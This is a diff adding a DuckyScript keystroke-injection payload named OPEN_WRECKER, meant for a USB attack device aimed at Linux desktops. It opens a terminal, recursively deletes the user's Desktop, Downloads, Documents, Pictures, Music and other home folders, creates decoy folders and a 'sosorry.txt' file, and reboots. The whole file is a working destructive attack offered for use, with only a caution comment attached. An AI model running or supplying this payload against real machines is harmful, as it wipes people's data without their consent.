@@ -1,0 +1,29 @@
+REM Author: FLIZZ3R
+REM TITLE: OPEN_WRECKER
+REM *** CAUTION *** This is a destructive payload. KNOW WHAT YOU'RE DOING BEFORE RUNNING.
+REM OBJECTIVE: Wipe open linux machine directories then create dummy directories and sorry text file
+REM ** Added Reboot for shutdown :< shutdown -h now>: ***
+
+DELAY 500
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 1500
+STRING rm -r Desktop Downloads Pictures #snap Documents Music Public Templates +++'VirtualBox VMs'
+ENTER 
+DELAY 1500 
+STRING mkdir Deskop downloadz Pics Dox ++Music Public TEMPS Vms
+ENTER
+DELAY 500
+STRING cd Deskop
+ENTER
+DELAY 500
+STRING touch sosorry.txt
+ENTER
+ALT F4
+DELAY 100
+CTRL-ALT t
+DELAY 1000
+STRING reboot
+ENTER
+REM :::FLIZZ3R@DISCORD)))
